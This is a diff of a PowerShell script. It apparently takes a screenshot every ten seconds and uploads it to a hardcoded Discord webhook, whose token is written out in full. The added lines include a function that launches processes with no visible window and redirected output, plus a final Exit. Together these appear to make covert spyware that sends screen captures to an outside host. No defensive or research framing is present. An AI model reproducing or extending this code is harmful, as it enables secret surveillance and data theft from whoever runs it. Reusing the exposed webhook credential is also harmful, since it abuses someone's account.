@@ -51,6 +51,23 @@ function Send-DiscordWebhook {
         Write-Host "Response:" $_.ErrorDetails.Message
     }
 }
+function Start-HiddenProcess {
+    param (
+        [string]$FilePath,
+        [string]$Arguments
+    )
+    
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $FilePath
+    $psi.Arguments = $Arguments
+    $psi.CreateNoWindow = $true
+    $psi.UseShellExecute = $false
+    $psi.RedirectStandardOutput = $true
+    $psi.RedirectStandardError = $true
+    
+    $process = [System.Diagnostics.Process]::Start($psi)
+    $process.WaitForExit()
+}
 
 # Webhook URL
 $WebhookUrl = "https://discord.com/api/webhooks/1279434221747961947/4v9LMvOEODPdrCLAPkBxgkjRc5Hkwfx2DkwBNy8AjJjp56aOwuuechnScKGGb77trwPb"
@@ -67,3 +84,4 @@ Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
      Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
      Start-Sleep -Seconds 10
 }
+Exit
